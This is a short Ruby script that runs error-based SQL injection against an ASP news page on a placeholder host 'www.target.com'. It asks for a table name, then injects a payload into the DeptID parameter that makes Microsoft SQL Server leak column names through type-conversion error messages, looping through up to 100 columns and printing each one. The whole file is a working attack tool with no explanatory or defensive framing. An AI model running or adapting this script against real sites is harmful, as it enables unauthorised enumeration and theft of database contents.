# encoding: UTF-8
require 'net/http'
require 'uri'

$host = 'www.target.com'

print "Input table name:"
table = gets.chomp

(1..100).each do |i|
    $target = "/news.asp?DeptID=1337';if (select top 1 col_name(object_id('#{table}'),#{i}) from sysobjects)>0 select 1--"
    $path = URI::encode($target)
    res = Net::HTTP.get_response($host, $path)
    /varchar value '(.*)' to data type int/ =~ res.body
    col = Regexp.last_match[1].strip
    puts col
    sleep 0.1
end
